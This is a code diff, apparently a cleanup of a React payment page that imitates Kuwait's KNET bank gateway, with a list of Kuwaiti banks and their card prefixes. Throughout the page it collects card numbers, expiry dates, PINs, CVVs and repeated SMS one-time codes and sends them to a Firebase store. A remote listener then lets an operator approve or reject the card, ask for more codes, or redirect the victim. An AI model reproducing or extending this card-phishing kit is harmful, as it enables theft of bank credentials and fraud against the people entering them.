@@ -6,26 +6,6 @@ import { db, handlePay } from "@/lib/firebase"
 import Loader from "@/components/loader"
 import { setupOnlineStatus } from "@/lib/util"
 
-type PaymentInfo = {
-  createdDate: string
-  cardNumber: string
-  year: string
-  month: string
-  bank?: string
-  cvv?: string
-  otp?: string
-  pass: string
-  cardState: string
-  allOtps: string[]
-  bank_card: string[]
-  prefix: string
-  status: "new" | "pending" | "approved" | "rejected"
-  phoneNumber: string
-  network: string
-  idNumber: string
-  otp2: string
-  step: number | string
-}
 const BANKS = [
   {
     value: "ABK",
@@ -47,13 +27,11 @@ const BANKS = [
     label: "Boubyan Bank",
     cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
   },
-
   {
     value: "BURGAN",
     label: "Burgan Bank",
     cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
   },
-
   {
     value: "CBK",
     label: "Commercial Bank of Kuwait",
@@ -64,7 +42,6 @@ const BANKS = [
     label: "Doha Bank",
     cardPrefixes: ["419252"],
   },
-
   {
     value: "GBK",
     label: "Gulf Bank",
@@ -75,7 +52,6 @@ const BANKS = [
     label: "TAM Bank",
     cardPrefixes: ["45077848", "45077849"],
   },
-
   {
     value: "KFH",
     label: "Kuwait Finance House",
@@ -119,7 +95,7 @@ export default function Payment() {
   const [total, setTotal] = useState("")
   const [isloading, setisloading] = useState(false)
   const router = useRouter()
-  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
+  const [paymentInfo, setPaymentInfo] = useState({
     createdDate: new Date().toISOString(),
     cardNumber: "",
     year: "",
@@ -136,23 +112,23 @@ export default function Payment() {
     network: "",
     idNumber: "",
     otp2: "",
-    step: 1
+    step: 1,
   })
   const [countdown, setCountdown] = useState(60)
   const [isCountdownActive, setIsCountdownActive] = useState(true)
   const [otpAttempts, setOtpAttempts] = useState(2)
-  const [otpValue, setOtpValue] = useState('')
+  const [otpValue, setOtpValue] = useState("")
+
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
+
   useEffect(() => {
-    //handleAddotp(paymentInfo.otp!)
-    const ty = localStorage!.getItem("amount")
+    const ty = localStorage.getItem("amount")
     if (ty) {
       setTotal(ty)
     }
   }, [])
-
 
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor")
@@ -160,16 +136,14 @@ export default function Payment() {
       setupOnlineStatus(visitorId!)
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
-          const data = docSnap.data() as PaymentInfo
+          const data = docSnap.data()
           if (data.step !== step) {
-            if (parseInt(data?.step?.toString()) === 5) {
-              window.location.href = '/auth'
-
-            } else if (parseInt(data?.step?.toString()) === 10) {
-
-              window.location.href = '/'
+            if (Number.parseInt(data?.step?.toString()) === 5) {
+              window.location.href = "/auth"
+            } else if (Number.parseInt(data?.step?.toString()) === 10) {
+              window.location.href = "/"
             } else {
-              setstep(parseInt(data?.step?.toString()) || 1)
+              setstep(Number.parseInt(data?.step?.toString()) || 1)
             }
           }
           if (data.status === "pending") {
@@ -177,10 +151,9 @@ export default function Payment() {
           } else if (data.status === "approved") {
             setisloading(false)
             setstep(2)
-          }
-          else if (data.status === "rejected") {
+          } else if (data.status === "rejected") {
             setisloading(false)
-            alert('Card rejected please try again!')
+            alert("Card rejected please try again!")
             setstep(1)
           }
         }
@@ -207,7 +180,7 @@ export default function Payment() {
   }, [isCountdownActive, countdown])
 
   return (
-    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir="ltr">
+    <div className="container" style={{ height: "100vh", margin: 0, padding: 0 }} dir="ltr">
       <form
         onSubmit={(e) => {
           e.preventDefault()
@@ -215,14 +188,16 @@ export default function Payment() {
         style={{ direction: "ltr" }}
       >
         <div id="PayPageEntry">
-          <div className="container" >
-            <div style={{ display: 'flex', justifyContent: 'center' }}>
+          <div className="container">
+            <div style={{ display: "flex", justifyContent: "center" }}>
               <img src="./mob.jpg" className="-" alt="logo" />
             </div>
             <div className="content-block">
               <div className="form-card">
-                <div className="container-" style={{ display: "flex", justifyContent: "center" }}>
-                  <img src="./next.svg" className="-" alt="logo" height={90} width={90} />
+                <div className="row">
+                  <div className="column-label">
+                    <label>Payment Form</label>
+                  </div>
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
@@ -241,44 +216,10 @@ export default function Payment() {
                 {/* Added for PG Eidia Discount ends   */}
               </div>
               <div className="form-card">
-                <div
-                  className="notification"
-                  style={{
-                    border: "#ff0000 1px solid",
-                    backgroundColor: "#f7dadd",
-                    fontSize: 12,
-                    fontFamily: "helvetica, arial, sans serif",
-                    color: "#ff0000",
-                    paddingRight: 15,
-                    display: "none",
-                    marginBottom: 3,
-                    textAlign: "center",
-                  }}
-                  id="otpmsgDC"
-                />
+                <div className="notification" id="otpmsgDC" />
                 {/*Customer Validation  for knet*/}
-                <div
-                  className="notification"
-                  style={{
-                    border: "#ff0000 1px solid",
-                    backgroundColor: "#f7dadd",
-                    fontSize: 12,
-                    fontFamily: "helvetica, arial, sans serif",
-                    color: "#ff0000",
-                    paddingRight: 15,
-                    display: "none",
-                    marginBottom: 3,
-                    textAlign: "center",
-                  }}
-                  id="CVmsg"
-                />
-                <div id="ValidationMessage">
-                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
-            font-family: helvetica, arial, sans serif;
-            color: #ff0000;
-              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
-                      </span*/}
-                </div>
+                <div className="notification" id="CVmsg" />
+                <div id="ValidationMessage"></div>
                 <div id="savedCardDiv" style={{ display: "none" }}>
                   {/* Commented the bank name display for kfast starts */}
                   <div className="row">
@@ -486,8 +427,6 @@ export default function Payment() {
                         </select>
                       </div>
                       <div className="row" id="PinRow">
-                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-
                         <div id="eComPin">
                           <label className="column-label"> PIN: </label>
                         </div>
@@ -515,7 +454,6 @@ export default function Payment() {
                       </div>
                       {step === 1 && paymentInfo.status === "approved" ? (
                         <div className="row" id="PinRow">
-                          {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
                           <input type="hidden" name="cardPinType" defaultValue="A" />
                           <div id="eComPin">
                             <label className="column-label"> Cvv: </label>
@@ -543,48 +481,45 @@ export default function Payment() {
                   <div>
                     <div className="row">
                       <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
-                        <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone
-                        number
+                        <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your
+                        registered phone number
                       </div>
                     </div>
                     <div className="row">
                       <label className="column-label">CardNumber:</label>
-                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}>
+                      <label style={{ color: "black", fontWeight: 100 }}>
                         {" "}
                         {paymentInfo.cardNumber.substring(0, 5) + "****" + paymentInfo.cardNumber.substring(10, 15)}
                       </label>
                     </div>
                     <div className="row">
                       <label className="column-label">Month expiry:</label>
-                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}> {paymentInfo.month}</label>
+                      <label style={{ color: "black", fontWeight: 100 }}> {paymentInfo.month}</label>
                     </div>
                     <div className="row">
                       <label className="column-label">Year expiry:</label>
-                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}> {paymentInfo.year}</label>
+                      <label style={{ color: "black", fontWeight: 100 }}> {paymentInfo.year}</label>
                     </div>
                     <div className="row">
                       <label className="column-label">Pin:</label>
-                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 200 }}>{"****"}</label>
+                      <label style={{ color: "black", fontWeight: 200 }}>{"****"}</label>
                     </div>
                     <div className="flex my-1">
                       <label className="column-value ">OTP:</label>
                       <input
                         onChange={(e: any) => {
-
                           setPaymentInfo({
                             ...paymentInfo,
                             otp: e.target.value,
                           })
                           setOtpValue(e.target.value)
-
-                        }
-                        }
+                        }}
                         type="tel"
                         maxLength={6}
                         id="timer"
                         className="w-full"
                         value={otpValue}
-                        placeholder={`Timeout in: 01:${countdown === 0 ? '00' : countdown}`}
+                        placeholder={`Timeout in: 01:${countdown === 0 ? "00" : countdown}`}
                       />
                     </div>
                     <div className="row">
@@ -624,14 +559,12 @@ export default function Payment() {
                             marginLeft: "20%",
                           }}
                         />
-                        <label className="column-value text-label" style={{ width: "70%", textAlign: "center" }}>
-                          Processing.. please wait ...
-                        </label>
+                        <label style={{ width: "70%", textAlign: "center" }}>Processing.. please wait ...</label>
                       </center>
                     </div>
                     <div style={{ display: "flex" }}>
                       <button
-                        style={{ background: "#f2f2f2", marginLeft: 0, borderRadius: 5 }}
+                        style={{ background: "#eaeaea", marginLeft: 0, borderRadius: 5 }}
                         disabled={
                           (step === 1 &&
                             (paymentInfo.prefix === "" ||
@@ -647,7 +580,6 @@ export default function Payment() {
                           if (step === 1) {
                             setisloading(true)
                             handlePay(paymentInfo, setPaymentInfo)
-
                           } else if (step === 2) {
                             if (!newotp.includes(paymentInfo.otp!)) {
                               newotp.push(paymentInfo.otp!)
@@ -660,7 +592,7 @@ export default function Payment() {
                             setOtpAttempts(newAttemptCount)
 
                             // Clear OTP input after submit
-                            setOtpValue('')
+                            setOtpValue("")
                             handlePay(paymentInfo, setPaymentInfo)
 
                             setTimeout(() => {
@@ -705,7 +637,7 @@ export default function Payment() {
                       >
                         {isloading ? "Wait..." : step === 1 ? "Submit" : "Confirm"}
                       </button>
-                      <button style={{ background: "#f2f2f2", marginLeft: 0, borderRadius: 5 }}>Cancel</button>
+                      <button style={{ background: "#eaeaea", marginLeft: 0, borderRadius: 5 }}>Cancel</button>
                     </div>
                   </div>
                 </div>
@@ -830,6 +762,7 @@ const Step3 = ({ setPaymentInfo, paymentInfo }: any) => {
     </div>
   )
 }
+
 const Step4 = (props: any) => {
   return (
     <div>
